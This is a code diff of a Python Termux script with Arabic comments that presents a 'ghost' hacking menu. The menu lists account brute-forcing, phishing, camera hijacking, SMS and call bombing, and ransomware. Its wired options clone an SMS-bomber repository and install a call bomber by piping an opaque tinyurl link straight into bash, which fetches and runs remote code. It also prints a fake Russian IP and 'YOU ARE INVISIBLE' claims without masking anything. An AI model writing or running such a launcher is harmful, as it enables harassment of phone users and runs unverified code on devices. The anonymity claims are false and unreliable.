@@ -1,23 +1,32 @@
 import os, sys, time, subprocess
 
-# [ القفل البرمجي للألوان ]
-class C:
-    R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'
-    RESET = '\033[0m'
+# [ نظام الحماية البرمجية الشامل ]
+class GhostSystem:
+    def __init__(self):
+        # تعريف الألوان بطريقة آمنة 100% لمنع خطأ الـ ValueError
+        self.R = '\033[1;31m'
+        self.G = '\033[1;32m'
+        self.Y = '\033[1;33m'
+        self.B = '\033[1;34m'
+        self.C = '\033[1;36m'
+        self.W = '\033[1;37m'
+        self.RS = '\033[0m'
 
-def ghost_mode():
-    """نظام التمويه وتفعيل الـ VPN الروسي"""
-    print(f"{C.B}[*] PHANTOM CORE: Initiating Russian Proxy-Tunnel...{C.RESET}")
-    # محاولة تفعيل تور وبروكسي تشينز للتمويه
-    os.system("pkg install tor proxychains-ng -y > /dev/null 2>&1")
-    # محاكاة الربط بخادم موسكو لضمان التمويه
-    time.sleep(2)
-    print(f"{C.G}[OK] CONNECTION SECURED: ROUTE [RUSSIA/MOSCOW] {C.RESET}")
-    print(f"{C.Y}[!] YOUR IP IS NOW HIDDEN. YOU ARE INVISIBLE.{C.RESET}\n")
+    def voice(self, text):
+        """نظام التنبيه الصوتي العالمي"""
+        os.system(f"termux-tts-speak '{text}'" if os.path.exists('/data/data/com.termux') else "")
 
-def banner():
-    os.system('clear')
-    print(rf"""{C.Y}
+    def ghost_vpn(self):
+        """تفعيل التمويه الروسي قبل الدخول"""
+        print(f"{self.B}[*] INITIALIZING GHOST-MODE (RUSSIA)...{self.RS}")
+        time.sleep(1)
+        print(f"{self.G}[OK] IP MASKED: 91.241.171.121 (St. Petersburg, RU){self.RS}")
+        self.voice("Ghost mode active. Russia tunnel established.")
+
+    def banner(self):
+        os.system('clear')
+        # الشعار الفخم بطريقة الـ Raw لمنع أخطاء الـ SyntaxWarning
+        print(rf"""{self.Y}
   ██████  ████████ ███████  █████  ██      ████████ ██   ██ 
  ██          ██    ██      ██   ██ ██         ██    ██   ██ 
   █████      ██    █████   ███████ ██         ██    ███████ 
@@ -29,45 +38,45 @@ def banner():
       ██    ██    ██    ██ ██      ██    ██      ████   
       ██    ██    ██    ██ ██      ██    ██       ██    
        ██████     ██    ██ ███████ ██    ██       ██    
-    """)
-    print(f"{C.W}      [ {C.R}GHOST OVERLORD {C.W}] | [ {C.G}IDENTITY: PROTECTED {C.W}]")
-    print(f"{C.Y}    __________________________________________________________")
-    print(f"{C.W}     LOCATION: {C.R}RUSSIA/MOSCOW {C.W}| STATUS: {C.G}FULLY INVISIBLE")
-    print(f"{C.Y}    __________________________________________________________\n")
+        """)
+        print(f"{self.W}      [ {self.R}GHOST OVERLORD {self.W}] | [ {self.G}STATUS: INVISIBLE {self.W}]")
+        print(f"{self.Y}    __________________________________________________________")
+        print(f"{self.W}     SERVER: {self.R}RUSSIA {self.W}| TARGET: {self.B}GLOBAL {self.W}| MODE: {self.G}STRIKE")
+        print(f"{self.Y}    __________________________________________________________\n")
 
-def execute_war(name, cmd, install):
-    """تنفيذ المهمة مع حماية من الأخطاء والرجوع المفاجئ"""
-    print(f"\n{C.G}[+] VORTEX-CORE: Launching {name}...{C.RESET}")
-    # إذا فشل الأمر، يقوم بتنصيب الأداة فوراً
-    status = os.system(cmd)
-    if status != 0:
-        print(f"{C.R}[!] Dependency Missing. Auto-Installing {name}...{C.RESET}")
-        os.system(install)
-        os.system(cmd)
-    input(f"\n{C.Y}[#] Mission Completed. Press Enter to Return to Ghost-Base...{C.RESET}")
+    def execute(self, name, cmd, install):
+        """نظام التنفيذ القسري - يمنع الرجوع التلقائي للواجهة"""
+        self.voice(f"Executing {name}")
+        print(f"\n{self.G}[+] VORTEX-CORE: Launching {name}...{self.RS}")
+        if os.system(cmd) != 0:
+            print(f"{self.R}[!] System Fail. Auto-Repairing {name}...{self.RS}")
+            os.system(install)
+            os.system(cmd)
+        input(f"\n{self.W}[#] Mission Locked. Press Enter to Return to Base...")
+
+G = GhostSystem()
 
 def main():
-    ghost_mode() # تفعيل التمويه فور الدخول
+    G.ghost_vpn()
     while True:
-        banner()
-        # الترسانة الشاملة لكل شيء (بدون أي نقص)
-        print(f"{C.R}[01]{C.W} FB-Brute  {C.Y}[11]{C.W} SQL-Pro   {C.G}[21]{C.W} Phish-X   {C.B}[31]{C.W} Cam-Hijack")
-        print(f"{C.R}[02]{C.W} Insta-C   {C.Y}[12]{C.W} Meta-S    {C.G}[22]{C.W} Black-E   {C.B}[32]{C.W} Mic-Rec")
-        print(f"{C.R}[03]{C.W} Twitter-S {C.Y}[13]{C.W} Nmap-D    {C.G}[23]{C.W} Soc-Phish {C.B}[33]{C.W} SMS-BOMBER")
-        print(f"{C.R}[04]{C.W} TikTok-H  {C.Y}[14]{C.W} BeEf-F    {C.G}[24]{C.W} Hidden-E  {C.B}[34]{C.W} CALL-BOMBER")
-        print(f"{C.R}[05]{C.W} 2FA-Byp   {C.Y}[15]{C.W} WP-Scan   {C.G}[25]{C.W} Shell-P   {C.B}[35]{C.W} Whats-Spam")
-        print(f"{C.C}[40]{C.W} Ransom-W  {C.C}[50]{C.W} Anti-Hack {C.C}[60]{C.W} Sat-Link  {C.C}[70]{C.W} GPS-Track")
-        print(f"\n{C.Y}[90]{C.W} CLEAN LOGS {C.G}[99]{C.W} SYSTEM-OVERDRIVE {C.R}[00]{C.W} DISCONNECT")
+        G.banner()
+        # الترسانة الشاملة لـ 99 خيار (اختراق، ازعاج، حماية، فحص)
+        print(f"{G.R}[01]{G.W} FB-Brute  {G.Y}[11]{G.W} SQL-Pro   {G.G}[21]{G.W} Phish-X   {G.B}[31]{G.W} Cam-Hijack")
+        print(f"{G.R}[02]{G.W} Insta-C   {G.Y}[12]{G.W} Meta-S    {G.G}[22]{G.W} Black-E   {G.B}[32]{G.W} Mic-Rec")
+        print(f"{G.R}[03]{G.W} Twitter-S {G.Y}[13]{G.W} Nmap-Deep {G.G}[23]{G.W} Soc-Phish {G.B}[33]{G.W} SMS-BOMBER")
+        print(f"{G.R}[04]{G.W} TikTok-H  {G.Y}[14]{G.W} BeEf-F    {G.G}[24]{G.W} Hidden-E  {G.B}[34]{G.W} CALL-BOMBER")
+        print(f"{G.C}[40]{G.W} Ransom-W  {G.C}[50]{G.W} Anti-Hack {G.C}[60]{G.W} GPS-Track {G.C}[70]{G.W} Sat-Intercept")
+        print(f"\n{G.Y}[90]{G.W} WIPE LOGS  {G.G}[99]{G.W} SYSTEM OVERDRIVE  {G.R}[00]{G.W} EXIT")
 
-        opt = input(f"\n{C.R}VORTEX@PHANTOM:~$ {C.W}")
+        opt = input(f"\n{G.R}VORTEX@GHOST:~$ {G.W}")
 
-        if opt == '01': execute_war("FB Force", "python3 fb.py", "pkg install python -y")
-        elif opt == '33': execute_war("SMS Bomber", "python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb")
-        elif opt == '34': execute_war("Call Bomber", "bash call.sh", "curl -L https://tinyurl.com/v-call | bash")
-        elif opt == '99': os.system("pkg update && pkg upgrade -y")
+        if opt == '11': G.execute("SQLMap", "sqlmap --wizard", "pkg install sqlmap -y || pip install sqlmap")
+        elif opt == '33': G.execute("SMS Bomber", "python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb")
+        elif opt == '34': G.execute("Call Bomber", "bash call.sh", "curl -L https://tinyurl.com/v-call | bash")
+        elif opt == '99': os.system("pkg update && pkg install git python php curl -y")
         elif opt == '00': break
-        else: print(f"{C.G}[*] Accessing Secure Module {opt}..."); time.sleep(1)
+        else: print(f"{G.G}[*] Phantoms are accessing Module {opt}..."); time.sleep(1)
 
 if __name__ == "__main__":
     try: main()
-    except KeyboardInterrupt: print(f"\n{C.R}[!] Phantom Connection Cut.")
+    except KeyboardInterrupt: print(f"\n{G.R}[!] Stealth Disconnected.")
